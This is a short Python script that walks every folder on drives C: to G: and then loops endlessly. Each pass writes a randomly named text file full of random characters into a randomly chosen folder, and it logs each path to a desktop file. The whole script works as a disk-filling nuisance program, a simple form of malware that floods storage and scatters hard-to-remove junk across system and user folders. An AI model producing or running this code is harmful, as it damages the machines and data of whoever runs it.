import os
from random import randint, choice


disks = ("C:", "D:", "E:", "F:", "G:")
totallist = []
for disk in disks:
    mylist = os.walk(disk)
    for i in mylist:
        totallist.append(i[0])


symbols = "~@#$%^-_(){}'`qwertyuiopasdfghjklzxcvbnm"


while True:

    nam = ""
    for i in range(randint(1, 100)):
        nam += choice(symbols)

    name = choice(totallist) + f'\\{nam}.txt'

    #"""This block is needed to track the process of creating files.
    
    with open ("C:\\Users\\User\\Desktop\\file_path.txt", "a") as f:     
        f.write(name + "\n")#"""

    with open (name,"w") as file:
        for i in range (randint(100, 1000)):
            line = ""
            for i in range (randint(100, 10000)):
                line += choice(symbols)
            file.write(line)



